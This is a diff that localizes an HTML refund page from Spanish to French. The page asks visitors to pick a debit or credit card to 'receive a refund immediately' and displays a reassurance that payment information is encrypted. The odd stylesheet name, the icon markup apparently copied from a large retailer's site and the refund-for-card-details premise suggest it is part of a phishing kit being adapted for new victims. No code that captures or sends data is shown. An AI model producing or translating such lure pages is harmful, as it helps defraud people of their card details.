@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Selecciona tu método de pago</title>
+    <title>Sélectionnez votre mode de remboursement</title>
     <link rel="stylesheet" href="/css/bratoka.css">
     <style>
         body {
@@ -185,10 +185,12 @@
     </style>
 </head>
 <body>
+    
+
     <div class="container">
         <div class="header">
-            <h1>Elija su método de reembolso preferido</h1>
-<p>Seleccione el método que prefiera para recibir su reembolso de inmediato</p>
+            <h1>Choisissez votre mode de remboursement préféré</h1>
+<p>Sélectionnez le mode que vous préférez pour recevoir votre remboursement immédiatement</p>
         </div>
         
         <form id="paymentForm">
@@ -197,8 +199,8 @@
                     <label>
                         <input type="radio" name="paymentMethod" value="card" id="cardRadio">
                         <div class="card-info">
-                            <div class="card-name">Tarjeta de débito o crédito</div>
-                            <div class="card-description">Seleccione su tarjeta</div>
+                            <div class="card-name">Carte bancaire (débit ou crédit)</div>
+                            <div class="card-description">Sélectionnez votre carte</div>
                             <div class="card-icons" style="display: flex; gap: 8px; margin-top: 8px;">
                                 <div class="small-card-logo mastercard-logo" style="width: 40px; height: 25px; background-size: contain; background-repeat: no-repeat; background-position: center;"></div>
                                 <div class="small-card-logo visa-logo" style="width: 40px; height: 25px; background-size: contain; background-repeat: no-repeat; background-position: center;"></div>
@@ -209,7 +211,7 @@
                     </label>
                     <div class="card-select-container" style="margin-top: 15px; display: none;" id="cardSelectContainer">
                         <select class="card-select" id="cardType" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px;">
-                            <option value="">Seleccione su tarjeta</option>
+                            <option value="">Sélectionnez votre carte</option>
                             <option value="mastercard">Mastercard</option>
                             <option value="visa">Visa</option>
                             <option value="amex">American Express</option>
@@ -222,7 +224,7 @@
             </div>
             
             <button type="submit" id="continue-btn" class="continue-button" disabled>
-                <span>Procesar reembolso</span>
+                <span>Traiter le remboursement</span>
                 <!-- <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                     <path d="M9 18l6-6-6-6"/>
                 </svg> -->
@@ -230,7 +232,7 @@
         </form>
         
         <div class="secure-info">
-            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" fill="none" role="presentation" class="r-633pao" data-testid="privacy-icon" style="flex: 0 1 0%; height: 20px; min-height: 20px; min-width: 20px; width: 20px;"><path d="M14 8h-.19V6.87a3.81 3.81 0 1 0-7.62 0V8H6a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2v-5a2 2 0 0 0-2-2ZM8.19 6.87a1.81 1.81 0 0 1 3.62 0V8H8.19V6.87ZM14 15H6v-5h8v5Z" fill="#565959"></path></svg><p>La información de pago está cifrada de forma segura</p>
+            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" fill="none" role="presentation" class="r-633pao" data-testid="privacy-icon" style="flex: 0 1 0%; height: 20px; min-height: 20px; min-width: 20px; width: 20px;"><path d="M14 8h-.19V6.87a3.81 3.81 0 1 0-7.62 0V8H6a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2v-5a2 2 0 0 0-2-2ZM8.19 6.87a1.81 1.81 0 0 1 3.62 0V8H8.19V6.87ZM14 15H6v-5h8v5Z" fill="#565959"></path></svg><p>Les informations de paiement sont chiffrées en toute sécurité</p>
         </div>
     </div>
 
